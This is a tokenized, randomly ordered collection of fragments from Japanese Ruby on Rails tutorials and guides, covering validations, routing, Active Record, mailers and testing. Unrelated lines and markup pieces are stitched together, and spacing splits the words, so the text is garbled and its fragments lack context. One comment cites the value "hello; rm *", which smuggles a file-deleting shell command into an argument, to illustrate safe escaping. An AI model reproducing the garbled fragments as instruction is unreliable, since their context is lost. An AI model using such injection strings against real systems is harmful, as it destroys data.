▁これは 、 悪意のある 人 物 が エスケープ されていない 危 険 な 変数 を 渡す ことができる ということです 。
▁ システム での cookies の 調 べ 方 については 、「 < ブラウザ 名 > ▁ inspect ▁cookies 」 で グ グ ってください 。
▁ 一意性 の 警 告
▁このメソッドは コレクション を列挙し 、 各 要素を ブロック に 渡します 。
▁ puts ▁' baz '
▁self を省略した 結果を リスト \ ref { code : application _ white list } に示します 。
▁ / help
▁Command - S h if t - R コマンドで テストが 失敗する ことを確認する 。
▁scaffold で 指定 する 名前 は 、\ emph { モデル } 名 の 命 名 の 習慣 に従って 「 単数形 」 に します ▟ リソース や コントローラは 「 複数形 」 で 表 し 、 モデル は 「 単数形 」 で 表 します 。
▁なお 、 上のコード は以下のように 書く こともできます 。
▁scaffold で生成した 実際の コード には リスト \ ref { code : demo _ microposts _ resource } よりも 多くの 改行 が追加され ている ことがあります 。
▁ マージ を 対象 内で 行なう 破壊的な バージョンの ` reverse _ merge !` もあります 。
▁" Product "▖ underscore ▁# ▁=> ▁" product "
▁( 上 で紹介した コメントアウト の テクニック は 、 コードは あって も テストが ど こ にも ない ような \ href { http :// en ▖ w i k tion ary ▖ org / wiki / q ue ll e _ h or re ur }{\ emph { ひ ど い } } アプリケーションを 急 い で 救 出 するときに も 役に立ちます ) 。
▁# ▁* ▁< tt > : allow _ nil </ tt > ▁- ▁S k ip ▁validation ▁if ▁attribute ▁is ▁+ nil + ▖
▁ 必要な アセットを ディレクトリに 配置 して まとめ た 後 、 Rails は さまざまな プリプロセッサ エンジン を 介 して それら を実行し 、 ブラウザに 配信 できるように それら を マニフェストファイル を 用 いて 結合 し 、 サイト テンプレート 用に 準備 します 。
▁ フォローしているユーザー の 人 数 と 、 フォロワー の 人 数 は 、 以下の 関連付け を使用して 計算 されます 。
▁ 実際には \ emph { もっと 時間 を かけて 読む のが 一般的 } です 。
▁<%= ▁javascript _ include _ tag ▁" main ", ▁"/ photos / columns " ▁%>
▁scope ( path _ name s : ▁ { ▁new : ▁' ne u ', ▁edit : ▁' be ar be it en ' ▁ }) ▁do
▁このメソッド によって 生成される SQL は 以下のような もの になります 。
▁ NoMethodError : ▁undefined ▁method ▁` palindrome ? '
▁╼╼ ▁% ▁subsection ▁ ssl _ in _ production ▁( end )╼╼ ▁\ subsection { 本番環境 用 Web サーバー } ▁% ▁( fold )╼ ▁\ label { sec : production _ webserver }╼╼
▁[ ス ク ラ ブ の使用 例 は ここ を参照 ]( https :// github ▖ com / f la v or j one s / lo of a h # lo of a h s crubber ) 。
▁しかし 本 当 の 問題 は 、 実行 された クエリ の 回 数 が 無 駄 に 多 い こと なのです 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / hash / indifferent _ access ▖ rb ` です 。
▁その 答 え は 、 Rails は 、 ユーザーが 新規 な のか 、 それ とも データベースに 存在する 既存の ユーザー である か を 、 Active ▁Record の \ k ode { new \_ record ?} 論理値 メソッドを使用して 区別 できる からです 。
▁Ruby ▁E nterprise ▁ Edit ion では 1 ▖ 8 ▖ 7-2 0 10 ▖ 02 以降 この バグ は 修正 されています 。
▁# ▁=> ▁< input ▁id =" d ob " ▁name =" d ob " ▁type =" date " ▁/>
▁` Article # time _ since _ created ` を ** 追加 ** して ` Article # summary ` を ** オーバーライド ** する 場合 :
▁#### ▁ プルリクエスト を更新する
▁つまり 、 Rails では 可視性 が ` public ` の メソッド であっても 、 ユーザーに 公開 されている とは 限 らない のです 。
▁redirect _ to ▁: back
▁Capybara の \ k ode { page } オブジェクト と異なり 、 ▁\ k ode { response } オブジェクトは サーバー の 応答 自体 のテスト に 使用できます ▟ ▁ この場合は 、 サインイン ページ への リダイレクト による \ k ode { update } アクション の 応答 を 確認し ます 。
▁ 重複 する メールアドレス 拒 否 のテスト
▁Users リソース における 、 ページ と URL の関係 。
▁ したがって 、 本 来 のある べ き 問 い は 「 Rails ▁ で 構 築 された Web サイト は ス ケ ー ル できる のか ? 」 となります 。
▁デフォルトは `: number ` です 。
▁Rails を 「 デフォルト スタック 」 のまま 無 改造 で 使う ことに しました ▟ これ に 伴 い 、 テスティング フレームワーク も 従来 使用 して いた RSpec から 、 標準 の minitest に切り替え ました 。
▁<%= ▁link _ to ▁' よう こ そ ', ▁ welcome _ path ▁%>
▁ 動的な サイト では 、 一般に コントローラは ▁( ユーザー などの ) ▁ サイトの 要素 を表し ており 、 データベース と の 通 信 を 担 当 している Ruby の オブジェクト である \ emph { model } ▁( モデル ) ▁ と 対 話 します 。
▁< div ▁id =" error _ explanation ">
▁上の 記 述 により 、 アプリケーション 内に 以下の 7 つの ルーティング が作成され 、 いずれも ` Photos ` コントローラに 対応 付け られます 。
▁<% ▁if ▁@ part ▖ assemblies ▖ empty ?
▁Microposts コントローラ 自体 の 構造 を リスト \ ref { code : demo _ microposts _ controller } に示します 。
▁ テスト を実行すると 、 期待どおり 失敗します 。
▁ 多少 苦 労 しても 構 わ ないので ローカル P C 環境で \ emph { Ruby ▁on ▁Rails チュートリアル } を 学習 したい と お 考え の方 には 、\ href { http :// install rails ▖ com /}{ InstallRails ▖ com } { p 2 } に従って 環境 を 構 築 する ことをお勧めします ▟ [ N I W A T A K O \_ T IP S ]
▁ ところで 、\ ref { sec : heroku _ commands } で ランダム な サブドメイン を生成する ために 以下の Ruby コードを 紹 介 しました が 、 このコード を理解する ための 準備 が 整 った ので 、 今 こ そ 読み 解 い てみましょう 。
▁ dup [ 1 ] [ 2 ] ▁= ▁4
▁ INNER ▁JOIN ▁orders ▁ ON ▁clients ▖ id ▁= ▁orders ▖ client _ id
▁これで テストにパス するはずです 。
▁ もっと 細 か く 制御 したい場合は 、 この フラグ を false に 設定 してから 、 コントローラで ` local _ request ?` メソッドを 実装 し 、 エラー 時に どの デバッグ情報 を出力する か を そこで 指定 してください 。
▁Ruby ▁on ▁Rails とは 、 Web 開発 のための フレームワーク であり 、 Ruby プログラミング言語 によって 記 述 されている 。
▁" Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App ▁| ▁Home "
▁#### # ▁` beginning _ of _ minute `、` end _ of _ minute `
▁@ part ▖ assemblies ▖ destroy (@ assembly 1 )
▁ タ イ ポ グ ラ フ ィ ー スタイル を追加する
▁* ▁ オブジェクト 指 向 の 表 記 方法で データベース を 操作 する
▁ 変更 結果を リスト \ ref { code : home _ root _ route } に示します ▟ ここでは 、 リスト { p 2 } の {3} get {/3} ルール を 以下のコード に置き換え ています 。
▁これは ` Blorgh :: Engine ` クラスの 定義 で 呼び出される ` isolate _ namespace ` メソッド による ものです 。
▁ 正規表現 \ k ode { VALID _ EMAIL _ REGEX } は \ emph { 定数 } です ▟ 大文字 で始まる 名前 は Ruby では 定数 を 意味 します 。
▁ n ▁this ▁step ▁( Bo x ~\ ref { aside : technical _ sophistication })▖) ╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - d f 67 d 8 ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁changing _ the _ layout _ links ▁( end )╼╼ ▁\ subsection { レイアウト の 変更 をテストする } ▁% ▁( fold )╼ ▁\ label { sec : testing _ layout _ change s }╼╼
▁module ▁ ActiveSupport
▁ Turbolinks を 特定の リンク で のみ 無効 に したい場合は 、 タグ に ` data - no - t ur bo link ` 属性 を追加します 。
▁ 注 釈 が追加された User モデル 。
▁ / users /1 のような URL の場合 、\ k ode { params [: id ]} の値 は 該当する ユーザーの \ k ode { id } ▁( こ の例では \ k ode {1} ) ▁ になります 。
▁Un like ▁most ▁introduction s ▁to ▁the ▁command ▁line , ▁which ▁typical ly ▁assume ▁a ▁relative ly ▁high ▁level ▁of ▁technical ▁ sophistication , ▁\ emph { Learn ▁En ough ▁Command ▁L in e ▁to ▁Be ▁D angerous } ▁ assumes ▁no ▁ prerequisites ▁other ▁than ▁general ▁computer ▁ knowledg e ▁( how ▁to ▁ la un ch ▁an ▁application , ▁how ▁to ▁use ▁a ▁web ▁browser , ▁how ▁to ▁\ href { http :// l m gt fy ▖ com / ? q = learn + to + touch + type } { touch ▁type }, ▁etc ▖) ▖
▁` seconds _ since _ midnight ` メソッドは 、 真 夜 中 からの 経 過 秒 数 を返します 。
▁ ユーザーが サインイン している 状態 は 、 セッション に 現在のユーザー が い る ▁(\ k ode { current _ user } が \ k ode { nil } でない ) ▁ ことで 表 されます 。
▁get ▁' preview ', ▁on : ▁: member
▁ 「 熟 練 」 という もの について
▁# ▁action _ controller / meta l / session _ man age ment ▖ rb
▁ これはリスト \ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive _ test } で使用されていました 。
▁ 純 粋 な JavaScript と異なり 、 JS - ERb ファイル では 組み込み Ruby ▁( ERb ) ▁ を使用できます ▟\ k ode { create ▖ js ▖ erb } ファイル では 、 フォロー 用の フォーム を \ k ode { unfollow } パーシャル で 更新 し 、 フォロワー の カウント を更新する の に ERb を使用しています ▁( もちろん これは 、 フォロー に成功した場合 の動作 です ) 。
▁#### ▁check _ box
▁上のコードでは 、 Capybara の \ k ode { have _ link } メソッドが 導 入 されています 。
▁require ▁" blorgh / engine "
▁ コンフリクト をすべて 解 消 して すべての テストが パス する ことを確認 でき たら 、 変更を プッシュ して 、 バックポート 用の プルリクエスト を 別 に 作成します 。
▁render ▁ inline : ▁" xml ▖ p ▁ { ' H or r id ▁ coding ▁practice ! ' } ", ▁type : ▁: builder
▁Rails コンソール でも 、\ k ode { {1} リスト 3 ▖ 6 {/1} } の {2} home {/2} アクション や 、 {3} {1} リスト 4 ▖ 2 {/1} {/3} の {2} full _ title {/2} ヘルパー と同じ 方法で メソッド を定義する ことができます
▁本章では 、 {0}{1} 第 6 章 {/1}{/0} で作成した User モデル のバリデーション を 信 頼 し 、 有効なメールアドレス を持っている ▁( 可能性のある ) ▁ 新規ユーザー を 増 や していきます 。
▁ 変更 後 の データモデル は 図 \ ref { fig : user _ model _ admin } のようになります 。
▁ 本当に アプリケーションの 名前 を 変 え て み たい場合は 、 次のような ランダム な サブドメイン 名 を設定し 、 この章 の冒頭 で説明した アプリケーションの セキュリティ を実装 してみる 方法 もあります 。
▁デフォルトは ` / us r / s bin / sendmail ` ▟ </ li >
▁HTML の 仕 様 は 時 と とも に 変わる 可能性 があると 思 っ ておく 方が よいでしょう ▟ 今後 も ブラウザで なるべく 正しく ページ を表示できるように 、 doc type を明示的に 宣言 しています 。
▁The ▁action ▁' about ' ▁could ▁not ▁be ▁found ▁for ▁StaticPages Controller
▁ リモート に プッシュ します 。
▁以前のバージョン の Ruby ▁on ▁Rails に 修正 パッチ を 当 て たい場合は 、 設定 を行って ローカル の ト ラ ッ キ ング ブランチ に切り替え る必要があります 。
▁ URI は 、 要 する に 「 ブラウザの アドレス バー にある あ れ 」 と 考え れば だいたい 合 っています 。
▁ これを行うには 、 まず リスト \ ref { code : home _ base _ title _ spec } に示すように 以前の テストコード を更新し 、\ k ode {" Home "} ▁ という文字 が表示され ていない ことを確認する テスト を追加します 。
▁ ハッシュ 形式で 与えられた HTML オプション を追加する こともできます 。
▁ 先 頭 に ア ス タ リスク ` * ` が 付 い ている 部分を 「 ワ イ ル ド カ ー ド セグメント 」 と呼びます 。
▁Active ▁Record には 、 モデルと データベースの テーブル と の マッピング 作成 時 に従う べ き ルール が いくつか あります 。
▁この 設定 により 、` article ` の内側に ▁ _ ネスト された リソース _ ▁ として ` comments ` が 作成されます 。
▁ メイラー は ` ActionMailer :: Base ` を継承し 、` app / mailers ` に 配置 され 、` app / views ` にある ビュー と 結 び 付け られます 。
▁invoke ▁ erb
▁# ▁active _ record / reflection ▖ rb
▁def ▁ acts _ like _ string ?
▁ umerate }╼╼ ▁% ▁subsection ▁a _ working _ follow _ button _ the _ standard _ way ▁( end )╼╼ ▁\ subsection { [ フォローする ] ▁ ボタン ▁( Ajax )} ▁% ▁( fold )╼ ▁\ label { sec : a _ working _ follow _ button _ with _ ajax }╼╼
▁# ▁=> ▁< input ▁type =" email " ▁id =" user _ email " ▁name =" user [ email ] " ▁value ="# {@ user ▖ email } " ▁/>
▁ 検証 ▁( validation ) ▁ については 本ガイド では 解説 していません が 、 たとえば
▁# ▁" hello ; ▁ rm ▁* " を実行して も ファイルは 削除され ない
▁ メソッドが クラス 自身 ▁( この場合は \ k ode { new }) ▁ に対して 呼び出される とき 、 この メソッドを \ emph { クラスメソッド } と呼びます 。
▁ 具体的には 、 ▁\ k ode { config } 変数 で 「 本番環境で は SSL を強制する 」 という 設定 を する だけです ▁( リスト \ ref { code : ssl _ in _ production }) 。
▁これで テストスイート は ▁\ passing ▁ になるはずです 。
▁ サンプルアプリケーション では 、 新規 作成された ユーザーを その 場 で サインイン させ 、 その 副 作 用 として 記憶トークン が つ い で に 作成されます が 、 この動作 に 依 存 すべき ではありません ▟ 安全 を 確 保 するために 、\ emph { すべての } ユーザーが 必ず 最初から 有効な 記憶トークン を持つ ように する必要があります 。
▁config ▖ assets ▖ prefix ▁= ▁"/ dev - assets "
▁C ▖ new ( 0, ▁1) ▖ instance _ value s ▁# ▁=> ▁{" x " ▁=> ▁ 0, ▁" y " ▁=> ▁1 }
▁( ここ は 若 干 高度な 内容 ですが 、 今は 詳 細 を理解する 必要はありません ) 。
▁ このように 指定 すると 、\ k ode { str } 変数 に 引数 を 渡す ことも 渡 さ ない こともできます ▟ 引数 を 渡 さ ない場合は 、 指定 の デフォルト値 が自動的に 使用されます 。
▁require ▁' y e t _ another _ engine / engine '
▁config ▖ action _ dispatch ▖ perform _ deep _ munge ▁= ▁false
▁ 期 待 される 動作 が行われていない ことを 示す 単 体 テスト も含め ても ら え ると さらに 助 か ります 。
▁config ▖ action _ controller ▖ asset _ host ▁= ▁" assets ▖ example ▖ com "
▁User ▖ find _ each ▁do ▁| user |
▁development サーバーを再起動 して リスト \ ref { code : development _ email _ settings } の設定 を 読み 込 んだ ら 、 次は { p 2 } で 自動生成 した User メイラー の {3} プレビュー ファイル {/3} の 更新 が必要です ▁( リスト \ ref { code : generated _ user _ mailer _ preview s }) 。
▁ サービス に使用する CDN から 、 アプリケーション で使用する ための カスタム サブドメイン ▁( 例 : ▁` my cdn subdomain ▖ fi ctional - cdn ▖ com ` ) ▁ を 交 付 し てもらう 必要もあります ▁( メ モ : ▁ fi ctional - cdn ▖ com は 説明 用 であり 、 少なくとも 執 筆 時点 では 本 当 の CDN プロ バ イ ダ ー ではありません ) 。
▁以下の モデル を例にとって 考えてみましょう 。
▁< table >
▁ エラー ページ など 、 一 般 ( Web ブラウザ など ) に 直接 公開 する データ
▁\ ref { sec : a _ user _ class } で作成した \ k ode { example \_ user ▖ rb } ファイルは 今後 使用する ことはありません ので 、 削除 してください 。
▁User モデル の内容は リスト \ ref { code : demo _ user _ model } に あります ▟ 驚 く ほど シンプルな 内容 ですが 、 継 承 ▁(\ ref { sec : inheritance _ hierarchies } および \ ref { sec : ruby _ classes }) ▁ によって 多くの 機能 が 備わっています 。
▁この節では 、 Rails アプリケーション を書く ために 重要 となる 、 いくつかの Ruby の データ構造 について説明します 。
▁name ▖ dasherize ▁: ▁name
▁ パス の 探 索 は 、 検索 パス での 出 現 順 で 行われます 。
▁{0} 図 4 ▖3{/0}{1} ▁StaticPages コントローラの 継 承 階層 ▟ {/1}
▁ユーザーの インデックス ページ のテスト 。
▁| ▁PATCH / PUT ▁| ▁ / photos / : id ▁| ▁photos # update ▁| ▁image _ path (: id ) ▁|
▁User モデル の中で は 、 右 式 で \ k ode { self } という キーワード は 省略 できます ▁( ちなみに ここ の \ k ode { self } は 現在のユーザー を指します )▟ したがって 、 次のように 書く こともできます 。
▁ 本書 は 、 筋 道 だった 一 本 道 の 物 語 の ようになっています 。
▁* ▁ IP ス プ ー フ ィ ング 攻 撃 を チェック します 。
▁gem ▁' rails - deprecated _ sanitizer '
▁* ▁` ActiveSupport :: TestCase ` の導入に伴い 、 Rails ▁4▖0 では ` ActiveRecord :: TestCase ` が 非推奨 となり ました 。
▁* ▁`: greater _ than _ or _ equal _ to ` ▁- ▁ 指定された 値 と 等 しい か 、 それ よりも 大きく なければならない こと を指定します 。
▁ いくつかの アプリケーション において は 、 この 初期 実装 だけで 目的 が 達 成 され 、 十分 に 思える かもしれません ▟ しかし リスト \ ref { code : from _ users _ followed _ by _ first _ cut } に はまだ 足 り ない もの があります ▟ それが 何 な のか 、 次の 節 に進む前に 考え てみてください
▁Rails ルーター から 見 れば 、` Sprockets ` が ` call ` に 応答 して ` [ status , ▁headers , ▁ body ]` を返す 限り 、 ルーティング 先 が Rack アプリケーション である か アクション である か は 区別 できません 。
▁ テスト ▁( リスト \ ref { code : relationship _ validation _ tests }) と アプリケーションコード ▁( リスト \ ref { code : relationship _ validations }) ▁ は 素 直 な 作り です 。
▁host ▁= ▁config [: host ] ▖ presence ▁|| ▁' localhost '
▁# ▁Rails ▖ root / config ▖ ru
▁### ▁` to _ query `
▁\ emph { new ▁ rel ic } は 「 新しい 遺 跡 」 という ト ン チ の 効 いた ネ ー ミ ング ですが 、 この 会 社 の 創 立 者 である L e w ▁C ir ne の名前 の ア ナ グ ラ ム ▁( 文字 を 入 れ 替 え た もの ) ▁ で もあります 。
▁ ユーザーが ブラウザで 画像 を 非 表示 に している場合 、 alt 属性 の テキスト を表示する ことができます 。
▁` local _ constant s ` メソッドは 、 レシーバ モジュール で 定義された 定数名 を返します 。
▁User で scaffold を実行し た場合 と同様に 、 scaffold ジェネレータ では マイクロポスト でも Rails モデルを 単数形 と する 習慣 に従い ます ▟ 実行 した コマンド が \ k ode { generate ▁Micropost } と 単数形 になって いた の はこの ためです 。
▁ユーザー モデルオブジェクト から メールを送信 する
▁ 画像 を リ サイズ するためには 、 画像 を 操作 する プログラム が必要 になります ▟ 今回は \ href { http :// www ▖ image magic k ▖ org /}{ ImageMagick } という プログラム を使う ので 、 これを 開発環境 に インストール しておく 必要 になります
▁ あらゆる 計算 メソッドは 、 モデル に対して 直接 実行されます 。
▁#### # ▁` collection ▖ find (▖▖▖)
▁hash [: b ] [: e ] ▁== ▁nil ▁# ▁=> ▁true
▁` Relation ` に ` # map !` や ` # delete _ if ` などの ミ ュ ー テ ー ター メソッド ▁( m u t at or ▁method ) ▁ が含まれ なくなりました 。
▁上のコードは 正常に動作し ます ▟ これは 、` Supplier ` クラス と ` Account ` クラス が 同じ スコープ 内で 定義されている ためです 。
▁address : ▁ com p any ▖ smtp _ host ▁ }
▁この テストでは 、 ▁( id を 紐 づ け るため の ) ▁ユーザー を作成する こと と 、 そのユーザー に 紐 付 いた マイクロポスト を作成する必要があります 。
▁flash ▖ keys ▁# ▁=> ▁[" string ", ▁: symbol ]
▁ 詳 しく は 、\ href { http :// get bootstrap ▖ com / components /}{ Bootstrap コンポーネント 一覧 ページ } ▁( 英語 ) ▁ を参照してください 。
▁create ▁app
▁2 番目の テストは 、 まず ユーザーの name に 無効な 値 ▁( blank ) ▁ を設定し 、\ k ode {@ user } オブジェクト の結果 も 無効 になる ことを テスト して 確認し ます 。
▁[ Create ▁repository ] ▁ をクリックして リポジトリ を作成し たら 、[ Comm and ▁line ] ▁> ▁[ I ▁have ▁an ▁existing ▁project ] ▁ をクリックして そこに 表示される 指示 に従い ます ▁( リスト \ ref { code : bitbucket _ add _ push }) 。
▁この 流れ では 、\ k ode { params [: session ] [: remember \_ me ]} の値 は \ k ode { ’ 0 ’} または \ k ode { ’ 1 ’} のいずれか になります が 、 そこに 罠 があり ました ▟ 0 も 1 も Ruby の 論理値 では \ k ode { true } である ことを思い出してください ▟ 従って 、 値は \ emph { 常に true } に なってしまい 、 チェックボックス は 常に オン になっている の と同じ 動作 に なってしまい ました 。
▁ 有効な 情報 を使用して ユーザーログイン をテストする
▁# ▁=> ▁false
▁ フォローしているユーザー を返します
▁=> ▁true
▁この 主 張 の一部 には 、 間違った 認 識 があります ▟ それ は 、\ href { http :// id le process ▖ word press ▖ com / 200 9 / 11 / 2 4/ present ation - summary - high - perform ance - at - mass ive - scale - less on s - learned - at - fa ce book /}{ あなた が \ emph { Web サイト } を ス ケ ー ル させる ので あって 、 フレームワーク が Web サイト を ス ケ ー ル させる の ではない } 、 ということです ▟ Rails ▁ は 素晴らしい フレームワーク では あります が 、 しかし 、 ただ の フレームワーク で しか ありません 。
▁` has _ many ` 関連付け に オブジェクトを ア サ イン し 、 しかも そのオブジェクト を 保存 したくない場合 、` collection ▖ build ` メソッド を使用してください 。
▁ 有効な 情報 で ユーザー登録 を しても エラーメッセージ が表示される
▁この 唯 一 の 例外 が \ ref { sec : scope s _ subselect s _ and _ a _ lambda } に 記 されています 。
▁ 実際 、 Rails の エ レ ガ ン ト な 仕 様 の 多く は 、 背 後 にある Ruby の高い 拡張 性 によって 実現 されている のです 。
▁ フラッシュメッセージ の 残 留 を キャッチ する テスト
▁ これまで 同様 、 RSpec を使用して \ k ode { authenticate } メソッド への 要求 内容 を表現する ことができます 。
▁この 例 では 、`: url ` オプション に ` articles _ path ` ヘルパー が渡され ています 。
▁| ▁POST ▁| ▁ / photos ▁| ▁photos # create ▁| ▁ 写 真 を 1 つ 作成する ▁|
▁=> ▁" The ▁string ▁is ▁nonempty "
▁=> ▁" New lines ▁(\ \ n ) ▁and ▁ tab s ▁(\ \ t ) ▁both ▁use ▁the ▁back slash ▁character ▁\ \ ▖ "
▁ 記憶トークン を参照 している ので 問題ありません ▟ メソッドの 引数 と同じ 名前 を使用すること は よく あります 。
▁Rack に関する 解説 はこの ガイド の 範 疇 を 超 え てしまいます 。
▁{0}{1} 第 2 章 {/1}{/0} では 、 Rails アプリケーションの 基本的な 仕 組み を 体 験 するために 、 別の プロジェクト を作成します 。
▁ パスワード再設定の \ k ode { update } アクション
▁( HTML 関連 では これ といった お勧め の 教 材 は 思い つ か なかった のですが 、 「\ href { http :// head first lab s ▖ com / books / h f html /}{ \ emph { Head ▁First ▁HTML } }」 は な か な か よ さ そう です ▟ David ▁S a w y er ▁M c F ar l and 著 「\ href { http :// www ▖ a mazon ▖ com / gp / product / 0 59 6 5 2 6 87 3 }{\ emph { CSS : ▁The ▁ Missing ▁M an u al } }」 を 推 薦 してくれ た 読者 も います ▟)
▁ バリデーション に 失敗した場合 には モデルに エラーメッセージ を追加し 、 バリデーション が 無効 になるように してください 。
▁ 無効な ユーザー登録 に対するテスト ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁ フォローしているユーザー と フォロワー を実装する 前に 、 User と Relationship の関連付け を行います 。
▁* ▁** 同じ ことを 繰り返す な ▁( Don ' t ▁R epeat ▁Your self : ▁ DRY ) : ** ▁ DRY は ソフトウェア 開発 上の 原 則 であり 、「 システム を構成する 知識 の あらゆる 部品 は 、 常に 単 一 であり 、 明 確 であり 、 信 頼 できる 形で 表現 されて い なければならない 」 という ものです 。
▁ このように して 追加 された 環境 は 、 デフォルトの 3 つの 環境 と同じように 利用できます ▟ ` rails ▁server ▁- e ▁ staging ` を 実行 すれば ステージング 環境で サーバーを起動 でき 、` rails ▁console ▁ staging ` や ` Rails ▖ env ▖ staging ?` など も 動作する ようになります 。
▁この 状 況 を 切り 抜 け るために 、 テスト 用の フィクスチャ ユーザー では 全 員 同じ パスワード 「\ k ode { password }」 を使用する ことにします ▟ これは フィクスチャ で よく 使われ る 手法 です 。
▁リスト \ ref { code : po p ul at or _ with _ admin } では 、 初期化 ハッシュ に \ k ode { admin : ▁true } を設定する ことで ユーザーを 管理者 に している ことに お 気 付き になりました でしょうか 。
▁### ▁ バックエンド
▁<%= ▁f ▖ text _ field ▁: author _ name ▁%>
▁User Mailer ▖ welcome _ email (@ user )▖ deliver _ later
▁ { nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁" a " ▁=> ▁" a "} ▖ symbolize _ keys
▁\ emph { Rails チュートリアル } で使用されている もの すべて を含め 、 ほとんどの マイグレーション が \ emph { 可 逆 } です ▟ これは 、\ k ode { db : rollback } という Rake タスク で 変更を 取り 消 せる ことを意味します ▟ これを “ マイグレーション の 取り 消 し ▁( migrate ▁down ) ” と呼びます 。
▁この エラー は 、 コメント の表示 に必要な パーシャル が 見つからない ためです 。
▁( リスト { p 0} の 他の {2} before _ save {/2} コールバック で 、 {2} email {/2} ではなく {2} self ▖ email {/2} と 記 述 して いた 理由 が 、 これで お わ か り いた だけ た と思います ) 。
▁\ k ode { help } アクション に対応する ビュー も 、 上のコード と似ています ▁({1}{2} リスト 3 ▖ 8 {/2}{/1} ) 。
▁ 確 認 バリデーション が 失敗した ときに 、` attribute ` ではなく `: # { attribute } _ confirmation ` に ア タ ッ チ される ようになりました 。
▁ 問題 を うまく 再 現 でき たら 、 その ことを issue の コメント に追加し ましょう 。
▁* ▁h im self または her self ▁-> ▁themselves に置き換える
▁`@ article ` オブジェクトは インスタンス変数 なので 、 ビューで 出力 される どの パーシャル から も アクセス できます 。
▁ 現在 は以下のように 簡潔 に 書く ことができます 。
▁リスト \ ref { code : preventing _ unactivated _ login s } に示したように 、 これを行うには \ k ode { user ▖ activated ?} が true の 場合にのみ ログイン を 許可 し 、 そうでない 場合は ルート URL にリダイレクトし て \ k ode { warning } で 警 告 を表示します ▁( 図 \ ref { fig : not _ activated _ warning }) 。
▁| ` logger ` | 可能 であれば メール 送 受 信 に関する 情報 を生成します 。
▁ ルート 作成 時に コロン を付け なかった 部分 は 、 静 的な セグメント として 固定 文字列 が 指定 されます 。
▁今度は テンプレート がない よう です ▟ Rails では テンプレート と い えば すなわち 「 ビュー 」 の ことです 。
▁email = foo %40 example ▖ com
▁( 詳細は {0}{1} 第 6 章 {/1}{/0} で説明します が 、 この ユーザー情報 は 、 Web アプリケーションの 背 後 にある データベースに保存 されています ▟)
▁この アクション が パブリックな API で使用され て お らず 、 HTTP メソッドを 自由に 変更 できる のであれば 、 ルーティング を更新し て ` patch ` を ` put ` の 代りに 使用できます 。
▁def ▁set _ condition al _ cache _ control !
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / object / blank ▖ rb ` です 。
▁Ruby は 、 多くの オブジェクト 指 向 言語 と同様 、 メソッドを まとめ る の に \ emph { クラス } を使用しています ▟ これらの クラス から \ emph { インスタンス が 生成される } ことで オブジェクトが 作成されます 。
▁これ だけで は 飾 り 気 が な さ すぎる 感じ も します が 、 今は これで よ し とします 。
▁ インストール や 設定 など に関する 多くの わ ず ら わ しい 問題 を 回 避 する ため 、 クラウド 開発 を 標準 で 採 用 しました ▁(\ ref { sec : up _ and _ running }) 。
▁ 比 較 の結果 が 一 致 すれば 、 送信された パスワード は 正しい と 認 識 され 、 そのユーザー は 認 証 されます 。
▁`: through ` オプションは 、 クエリ 実行時に 経 由 する 結合 ( join ) モデル を指定します 。
▁\ href { http :// www ▖ michael hartl ▖ com /}{ マ イ ケ ル ハ ート ル ▁( Michael ▁Hartl )} ▁ は 「\ href { http :// www ▖ railstutorial ▖ org /}{ \ emph { Ruby ▁on ▁Rails ▁ チュートリアル } }」 という ▁Web ▁ 開発 を 始 め る ときに 最も よく 参 考 に される 本 の 著者 です ▟ また 、\ href { http :// www ▖ s of t c over ▖ io /}{ S of t c over } ▁という 自 費 出 版 プラットフォーム の 共 同 創 業 者 で もあります 。
▁ ふ た た び ` Article sController ` に 戻 り ましょう ▟ 先ほど 作成した ` Article ` モデル を使用して 、` create ` アクション を変更 し なければなりません 。
▁たとえば 、` ActionMailer :: Base ` に 以下の 定義 が あるとします 。
▁" p ", ▁" q ", ▁" r ", ▁" s ", ▁" t ", ▁" u ", ▁" v ", ▁" w ", ▁" x ", ▁" y ", ▁" z "]
▁** N ▁+ ▁1 クエリ 問題 **
▁ アプリケーションの 簡単な 説明 ▁( 訳 注 : ▁ 近 年 は ▁ ▖ rdoc よりも ▁ ▖ md ▁ ファイル の方が よく 使われ ている よう です )
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / module / alias ing ▖ rb ` です 。
▁followed に代えて \ emph { following } と すれば 、 following s のように 複数形 にも 対応 できる の ではない でしょうか ▟ しかし 今度は 意味 が 曖昧 になってしまいます ▟ この 文 脈 で ▁“ following ” ▁ と 書く と 、 英語 では \ emph { あなた を } フォローする 人 々 の 集合 、 つまり あなた の フォロワー を指します ▟ これ では 意味 が 正 反 対 になってしまいます 。
▁* ▁FROM ▁" articles "
▁ 最後の コマンドは 、\ k ode { valid ?} メソッドで 、 オブジェクトが ひとつ 以上の 検証 に 失敗した ときに \ k ode { false } を返します ▟ すべての 検証 が パス した 場合は \ k ode { true } を返します 。
▁def ▁name _ with _ initial
▁clients ▖ each ▁do ▁| client |
▁{0} 図 2 ▖9{/0} ▁{1} 2 人目のユーザー が追加された 一覧 ページ ▁(\ href { http ://0▖0▖0▖0:3000/ users }{/ users }) {/1}
▁% w ( 1 ▁2 ▁3 ▁4 ▁5 ▁6 ▁7 )▖ in _ groups (3)
▁ エンジンの クラスを オ ー プ ン クラス 化 ▁( open ▁class ing ) ▁ することで 、 メ イン の アプリケーションで 使用 できるように 再 定義 されます 。
▁ 特定の ユーザー を表示する ページ
▁| ▁DELETE ▁| ▁ / photos / : id ▁| ▁images # destroy ▁| ▁ photo _ path (: id ) ▁|
▁$ ▁ heroku ▁run ▁console
▁ --- ---------------- ----------------
▁(\ ref { sec : a _ hashed _ password } の パスワード ダイジェスト のとき の マイグレーション と 比 較 してみましょう ) 。
▁ umerate }╼╼ ▁% ▁subsection ▁creating _ microposts ▁( end )╼╼ ▁\ subsection { フィード の 原 型 } ▁% ▁( fold )╼ ▁\ label { sec : a _ proto _ feed }╼╼
▁# ▁ SELECT ▁* ▁FROM ▁clients ▁OR DER ▁BY ▁orders _ count ▁ASC , ▁created _ at ▁DESC
▁encoding : ▁' S pe cial Encoding ',
